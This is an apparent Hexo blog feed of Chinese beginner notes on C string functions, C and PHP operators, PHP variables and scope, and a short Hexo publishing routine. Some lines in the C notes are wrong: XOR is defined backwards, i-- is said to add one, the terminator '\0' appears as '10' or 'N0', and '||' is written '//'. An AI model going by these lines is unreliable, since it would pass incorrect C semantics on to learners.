        <content type="html"><![CDATA[<p>C语言 （3）字符串处理函数 </p><p>C语言提供了丰富的字符串处理函数，用来实现对字符串的输入、输出、合并、修改、比较、转换和复制等功能。<br>(1)字符串输入函数gets()<br>语法格式<br>        gets(字符数组名)<br>功能<br>        从终端输入一个字符串到字符数组，并且返回该字符数组的起始地址。<br>(2)字符串输出函数puts()<br>语法格式<br>        puts (字符数组名)</p><p>[功能]</p><p>​         将一个字符串，(以0结束的字符序列)输出到终端。</p><p>(3)字符串连接函数strcat()</p><p>[语法格式]</p><p>​        strcat(字符数组1,字符数组2)</p><p>[功能]</p><p>​         连接两个字符数组中的字符串，把字符串2连接到字符串1的后面，把得到的结果放在字符数组1中。</p><p>(4)字符串复制函数strcpy() </p><p>[语法格式]</p><p>​         strcpy(字符数组1,字符串2)</p><p>[功能]</p><p>​        把字符串2连同串结束标志10复制到字符数组1中，其中字符串2可以是字符数组或字符串常量</p><p>(5)字符串比较函数strcmp()</p><p>[语法格式]</p><p>​        strcmp(字符串1,字符串2)</p><p>[功能]</p><p>​        将字符串1和字符串2中的两个字符串自左向右按照各字符的ASCII码值逐对进行比较，直到出现不同的字符或遇到N0为止。函数的返回值:①若字符串1=字符串2,则返回值为0;②若字符串1&gt;字符串2,则返回值为正整数;③若字符串1&lt;字符串2,则返回值为负整数。</p><p>(6) 求字符串长度函数strlen()</p><p>[语法格式]</p><p>​        strlen(字符串)</p><p>[功能]</p><p>​        测试字符串长度，即字符串中字符的个数，不包括’\0’。</p><p>(7)大写字母转换为小写字母函数strlwr()</p><p>[语法格式]</p><p>​        strlwr(字符串)</p><p>[功能)]</p><p>​        将字符串中大写字母转换成小写字母。</p><p>(8)小写字母转换为大写字母函数strupr()</p><p>[语法格式]</p><p>​       strupr(字符串)</p><p>[功能]</p><p>​        将字符串中小写字母转换成大写字母。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c语言：运算符和表达式（2）</title>
      <link href="2020/10/22/c-yu-yan-yun-suan-fu-he-biao-da-shi-2/"/>
      <url>2020/10/22/c-yu-yan-yun-suan-fu-he-biao-da-shi-2/</url>
      
        <content type="html"><![CDATA[<p>五·位运算符和位运算表达式</p><p>​    操作符  名称  优先  结合 对象</p><p>~  按位取反  1 ←  单</p><p>《  按位左移  2  →  双</p><p>  》按位右移  3  →  双</p><p>&amp;  按位与  4  →  双</p><p>^  按位异或  5  →  双</p><p>|  按位或  6 →  双</p><p>1·按位取反</p><p>​    ~  操作数</p><p>2·按位移 </p><p>​    操作数  《（》） 左（右）移位数</p><p>3·按位与</p><p>​    操作数 1&amp;操作数2</p><p>​    如果操作数相应位数都为一，则该位为一否则为零</p><p>4·按位异或运算</p><p>​    操作数1^操作数2</p><p>操作数相应位相同为1 相异为零</p><p>5·按位或</p><p>   操作数1|操作数2</p><p>操作数相应位均为零为零 否则为一</p><p>六·条件运算符和条件表达式</p><p> 判定式？表达式1：表达式2</p><p>三目运算  自左向右</p><p>七·逗号运算符和逗号表达式</p><p>   自左向右 取最右值</p><p>八·求字节运算符与求字节表达式</p><p>sizeof（类型名|变量名） 单目</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c语言：运算符和表达式（1）</title>
      <link href="2020/10/22/c-yu-yan-yun-suan-fu-he-biao-da-shi-1/"/>
      <url>2020/10/22/c-yu-yan-yun-suan-fu-he-biao-da-shi-1/</url>
      
        <content type="html"><![CDATA[<p>一·算术运算符</p><p>​    1.自增和自减运算符（自左向右）</p><p>​     ++i 在使用变量之前 先使i的值加一</p><p>​     –i   在使用变量之前 先使i的值减一</p><p>​     ++  使用变量i之后，使i的值加一</p><p>​     i–   使用变量i之后，使i的值加一</p><p>二·赋值运算符和赋值表达式</p><p>​    分以简单赋值“=”算数复合赋值“*=”，“+=”，“-=”，“/=‘’，”%=“和位复合运算赋值”&gt;&gt;=“，”&lt;&lt;=“,”&amp;=”，“^=”，“|=”三类共十一种（自右向左）</p><p>赋值表达式</p><p>​    变量名  赋值运算符  表达式</p><p>三·关系运算符与关系表达式</p><p>  （&gt;,&gt;=,&lt;,&lt;=)  优先级较高</p><p>  （==，！=）优先级较低</p><p>关系表达式</p><p>​    表达式1  关系运算符  表达式2</p><p>四·逻辑运算符与逻辑表达式</p><p>1·逻辑运算符（自左向右）</p><p>​     ！逻辑非（自右向左）</p><p>​     &amp;&amp; 逻辑与 双真则真</p><p>​     || 逻辑或  单真则真</p><p>2·逻辑运算符优先级从高到低为</p><p>​    “！” →算术→关系→“&amp;&amp;”→“//“→赋值</p><p>3·逻辑表达式</p><p>​    [表达式1]  逻辑运算符  表达式2</p><p>​    一旦能够确定逻辑表达式的值，就立即结束运算，不在进行后面表达式的运算。逻辑运算的结果为0或1。</p><p>​     “&amp;&amp;”“//“都对操作数有”短路“计算，对于”&amp;&amp;“只有左边表达式为真，才计算右边表达式的值，对于”||“只有左边表达式为假，才计算右边表达式的值。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客更新三步</title>
      <link href="2020/10/14/bo-ke-geng-xin-san-bu/"/>
      <url>2020/10/14/bo-ke-geng-xin-san-bu/</url>
      
        <content type="html"><![CDATA[<ol><li><p>在博客根目录下 hexo new post “文章标题”</p></li><li><p>hexo g</p></li><li><p>hexo d</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP：基本语法（2）</title>
      <link href="2020/10/14/php-ji-ben-yu-fa-2/"/>
      <url>2020/10/14/php-ji-ben-yu-fa-2/</url>
      
        <content type="html"><![CDATA[<p>1.PHP 逻辑运算符</p><p><strong>运算符    名称    描述    实例<br>x and y    与    如果 x 和 y 都为 true，则返回 true    x=6 y=3 (x &lt; 10 and y &gt; 1) 返回 true<br>x or y    或    如果 x 和 y 至少有一个为 true，则返回 true    x=6 y=3 (x==6 or y==5) 返回 true<br>x xor y    异或    如果 x 和 y 有且仅有一个为 true，则返回 true    x=6 y=3 (x==6 xor y==3) 返回 false<br>x &amp;&amp; y    与    如果 x 和 y 都为 true，则返回 true    x=6 y=3(x &lt; 10 &amp;&amp; y &gt; 1) 返回 true<br>x || y    或    如果 x 和 y 至少有一个为 true，则返回 true    x=6 y=3(x==5 || y==5) 返回 false<br>! x    非    如果 x 不为 true，则返回 true    x=6y=3!(x==y) 返回 true<br>**2.PHP 数组运算符</strong><br>运算符    名称    描述<br>x + y    集合    x 和 y 的集合<br>x == y    相等    如果 x 和 y 具有相同的键/值对，则返回 true<br>x === y    恒等    如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true<br>x != y    不相等    如果 x 不等于 y，则返回 true<br>x &lt;&gt; y    不相等    如果 x 不等于 y，则返回 true<br>x !== y    不恒等    如果 x 不等于 y，则返回 true<br>以下实例演示了使用一些数组运算符得到的不同结果：</p><p>实例<br><!--?php$x = array("a" =--> "red", "b" =&gt; "green"); $y = array("c" =&gt; "blue", "d" =&gt; "yellow"); $z = $x + $y; // $x 和 $y 数组合并var_dump($z);var_dump($x == $y);var_dump($x === $y);var_dump($x != $y);var_dump($x &lt;&gt; $y);var_dump($x !== $y);?&gt;</p><p><strong>3.三元运算符</strong><br>另一个条件运算符是”?:”（或三元）运算符 。</p><p>语法格式</p><p>(expr1) ? (expr2) : (expr3)<br>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。</p><p>自 PHP 5.3 起，可以省略三元运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 TRUE 时返回 expr1，否则返回 expr3。</p><p>实例</p><p>以下实例中通过判断 $_GET 请求中含有 user 值，如果有返回 $_GET[‘user’]，否则返回 nobody：</p><p><strong>4.组合比较符(PHP7+)</strong><br>PHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 &lt;=&gt;。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。</p><p>语法格式如下：</p><p>$c = $a &lt;=&gt; $b;<br>解析如下：</p><p>如果 $a &gt; $b, 则 $c 的值为 1。<br>如果 $a == $b, 则 $c 的值为 0。<br>如果 $a &lt; $b, 则 $c 的值为 -1。<br>实例如下：</p><p>实例<br>&lt;?php<br>// 整型<br>echo 1 &lt;=&gt; 1; // 0<br>echo 1 &lt;=&gt; 2; // -1<br>echo 2 &lt;=&gt; 1; // 1</p><p>// 浮点型<br>echo 1.5 &lt;=&gt; 1.5; // 0<br>echo 1.5 &lt;=&gt; 2.5; // -1<br>echo 2.5 &lt;=&gt; 1.5; // 1</p><p>// 字符串<br>echo “a” &lt;=&gt; “a”; // 0<br>echo “a” &lt;=&gt; “b”; // -1<br>echo “b” &lt;=&gt; “a”; // 1<br>?&gt;</p><p><strong>5.运算符优先级</strong><br>下表按照优先级从高到低列出了运算符。同一行中的运算符具有相同优先级，此时它们的结合方向决定求值顺序。</p><p>说明：左 ＝ 从左到右，右 ＝ 从右到左。</p><p>结合方向    运算符    附加信息<br>无    clone new    clone 和 new<br>左    [    array()<br>右    ++ – ~ (int) (float) (string) (array) (object) (bool) @    类型和递增／递减<br>无    instanceof    类型<br>右    !    逻辑运算符<br>左    * / %    算术运算符<br>左    + – .    算术运算符和字符串运算符<br>左    &lt;&lt; &gt;&gt;    位运算符<br>无    == != === !== &lt;&gt;    比较运算符<br>左    &amp;    位运算符和引用<br>左    ^    位运算符<br>左    |    位运算符<br>左    &amp;&amp;    逻辑运算符<br>左    ||    逻辑运算符<br>左    ? :    三元运算符<br>右    = += -= *= /= .= %= &amp;= |= ^= &lt;&lt;= &gt;&gt;= =&gt;    赋值运算符<br>左    and    逻辑运算符<br>左    xor    逻辑运算符<br>左    or    逻辑运算符<br>左    ,    多处用到<br>运算符优先级中，or 和 ||，&amp;&amp; 和 and 都是逻辑运算符，效果一样，但是其优先级却不一样。</p><p><strong>括号的使用</strong></p><p>我们通过括号的配对来明确标明运算顺序，而非靠运算符优先级和结合性来决定，通常能够增加代码的可读性。</p><p>实例<br>&lt;?php<br>// 括号优先运算</p><p>$a = 1;<br>$b = 2;<br>$c = 3;<br>$d = $a + $b * $c;<br>echo $d;<br>echo “\n”;<br>$e = ($a + $b) * $c; // 使用括号<br>echo $e;<br>echo “\n”;<br>?&gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP：基本语法（1）</title>
      <link href="2020/10/14/php-ji-ben-yu-fa-1/"/>
      <url>2020/10/14/php-ji-ben-yu-fa-1/</url>
      
        <content type="html"><![CDATA[<p><strong>1.PHP脚本以&lt;?php开始，</strong></p><p>以?&gt;结束</p><p>php中的每个代码行都必须以分号结束，用于把指令集区分开来。</p><p><strong>2.PHP变量</strong></p><p>变量是用于存储信息的”容器”:</p><p>实例</p><!--?php$x=5;$y=6;$z=$x+$y;echo $z;?--><p>在PHP中，这些字母被称为变量。变量是用于存储数据的容器。</p><p>PHP 变量规则：</p><p>变量以 $ 符号开始，后面跟着变量的名称<br>变量名必须以字母或者下划线字符开始<br>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）<br>变量名不能包含空格<br>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</p><p><strong>3.PHP变量作用域</strong></p><p>变量的作用域是脚本中变量可被引用的部分</p><p>PHP有四种不同的变量作用域：</p><p>local  global  static  parameter</p><p>局部和全局作用域<br>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p><p>在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问</p><p>Static 作用域<br>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p><p>要做到这一点，请在您第一次声明变量时使用 static 关键字：</p><p>实例<br>&lt;?php<br>function myTest()<br>{<br>  static $x=0;<br>  echo $x;<br>  $x++;<br>  echo PHP_EOL;  // 换行符<br>}</p><p>myTest();<br>myTest();<br>myTest();<br>?&gt;</p><p><strong>4.PHP 并置运算符</strong><br>在 PHP 中，只有一个字符串运算符。</p><p>并置运算符 (.) 用于把两个字符串值连接起来。</p><p>下面的实例演示了如何将两个字符串变量连接在一起：</p><p>实例<br><!--?php $txt1="Hello world!"; $txt2="What a nice day!"; echo $txt1 . " " . $txt2; ?--><br>上面的代码将输出：Hello world! What a nice day!</p><p><strong>5.PHP strlen() 函数</strong><br>有时知道字符串值的长度是很有用的。</p><p>strlen() 函数返回字符串的长度（字节数）。</p><p>下面的实例返回字符串 “Hello world!” 的长度：</p><p>实例<br><!--?php echo strlen("Hello world!"); ?--></p><p>上面的代码将输出12</p><p><strong>6.PHP strpos() 函数</strong><br>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。</p><p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。</p><p>下面的实例在字符串 “Hello world!” 中查找文本 “world”：</p><p>实例<br><!--?php echo strpos("Hello world!","world"); ?--></p><p>运行实例 »<br>上面的代码将输出：6</p><p>提示：在上面的实例中，字符串 “world” 的位置是 6。<strong>之所以是 6 而不是 7 的原因是，字符串中第一个字符的位置是 0，而不是 1。</strong></p><p><strong>7.PHP 算术运算符</strong><br>运算符    名称                            描述                           实例                  结果<br>x + y       加                                 x 和 y 的和                2 + 2                4<br>x - y        减                                 x 和 y 的差                5 - 2                 3<br>x * y       乘                                 x 和 y 的积                5 * 2                10<br>x / y        除                                 x 和 y 的商               15 / 5                3<br>x % y      模（除法的余数）      x 除以 y 的余数        5 % 2                1<br>- x           取反                             x 取反                       <!--?php              -2                                                                                      $x =2;                                                                                      echo -$x;                                                                                      ?--><br>a . b        并置                            连接两个字符串    “Hi” . “Ha”        HiHa</p><p><strong>8.PHP 赋值运算符</strong><br>在 PHP 中，基本的赋值运算符是 “=”。它意味着左操作数被设置为右侧表达式的值。也就是说，”$x = 5” 的值是 5。</p><p>运算符    等同于         描述<br>x = y       x = y            左操作数被设置为右侧表达式的值<br>x += y     x = x + y      加<br>x -= y      x = x - y       减<br>x *= y     x = x * y      乘<br>x /= y      x = x / y      除<br>x %= y    x = x % y     模（除法的余数）<br>a .= b    a = a . b        连接两个字符串<br>以下实例演示了使用不同赋值运算符得到的不同结果：</p><p>实例<br>&lt;?php<br>$x=10;<br>echo $x; // 输出10</p><p>$y=20;<br>$y += 100;<br>echo $y; // 输出120</p><p>$z=50;<br>$z -= 25;<br>echo $z; // 输出25</p><p>$i=5;<br>$i *= 6;<br>echo $i; // 输出30</p><p>$j=10;<br>$j /= 5;<br>echo $j; // 输出2</p><p>$k=15;<br>$k %= 4;<br>echo $k; // 输出3<br>?&gt;</p><p><strong>9.PHP 递增/递减运算符</strong><br>运算符    名称        描述<br>++ x        预递增    x 加 1，然后返回 x<br>x ++        后递增    返回 x，然后 x 加 1<br>– x          预递减    x 减 1，然后返回 x<br>x –          后递减    返回 x，然后 x 减 1<br>以下实例演示了使用递增/递减运算符得到的结果：</p><p>实例<br>&lt;?php<br>$x=10;<br>echo ++$x; // 输出11</p><p>$y=10;<br>echo $y++; // 输出10</p><p>$z=5;<br>echo –$z; // 输出4</p><p>$i=5;<br>echo $i–; // 输出5<br>?&gt;</p><p><strong>10.PHP 比较运算符</strong><br>比较操作符可以让您比较两个值：</p><p>运算符        名称              描述                                                                                 实例<br>x == y         等于              如果 x 等于 y，则返回 true                                           5==8 返回 false<br>x === y       绝对等于      如果 x 等于 y，且它们类型相同，则返回 true            5===”5” 返回 false<br>x != y          不等于          如果 x 不等于 y，则返回 true                                       5!=8 返回 true<br>x &lt;&gt; y         不等于          如果 x 不等于 y，则返回 true                                       5&lt;&gt;8 返回 true<br>x !== y        绝对不等于  如果 x 不等于 y，或它们类型不相同，则返回 true     5!==”5” 返回 true<br>x &gt; y           大于              如果 x 大于 y，则返回 true                                           5&gt;8 返回 false<br>x &lt; y           小于              如果 x 小于 y，则返回 true                                           5&lt;8 返回 true<br>x &gt;= y         大于等于      如果 x 大于或者等于 y，则返回 true                            5&gt;=8 返回 false<br>x &lt;= y         小于等于      如果 x 小于或者等于 y，则返回 true                            5&lt;=8 返回 true<br>以下实例演示了使用一些比较运算符得到的不同结果：</p><p>实例<br>&lt;?php<br>$x=100;<br>$y=”100”;</p><p>var_dump($x == $y);<br>echo “ <br>“;<br>var_dump($x === $y);<br>echo “ <br>“;<br>var_dump($x != $y);<br>echo “ <br>“;<br>var_dump($x !== $y);<br>echo “ <br>“;</p><p>$a=50;<br>$b=90;</p><p>var_dump($a &gt; $b);<br>echo “<br>“;<br>var_dump($a &lt; $b);<br>?&gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP：介绍</title>
      <link href="2020/10/08/php-jie-shao/"/>
      <url>2020/10/08/php-jie-shao/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-是什么？"><a href="#PHP-是什么？" class="headerlink" title="PHP 是什么？"></a>PHP 是什么？</h2><ul><li>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</li><li>PHP 脚本在服务器上执行。</li><li>PHP 可免费下载使用。</li></ul><h2 id="PHP-文件是什么？"><a href="#PHP-文件是什么？" class="headerlink" title="PHP 文件是什么？"></a>PHP 文件是什么？</h2><ul><li>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</li><li>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</li><li>PHP 文件的默认文件扩展名是 “.php”</li></ul><h2 id="为什么使用-PHP？"><a href="#为什么使用-PHP？" class="headerlink" title="为什么使用 PHP？"></a>为什么使用 PHP？</h2><ul><li>PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）</li><li>PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）</li><li>PHP 提供了广泛的数据库支持</li><li>PHP 是免费的，可从官方的 PHP 资源下载它：<a href="http://www.php.net/"> www.php.net</a></li><li>PHP 易于学习，并可高效地运行在服务器端</li></ul>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
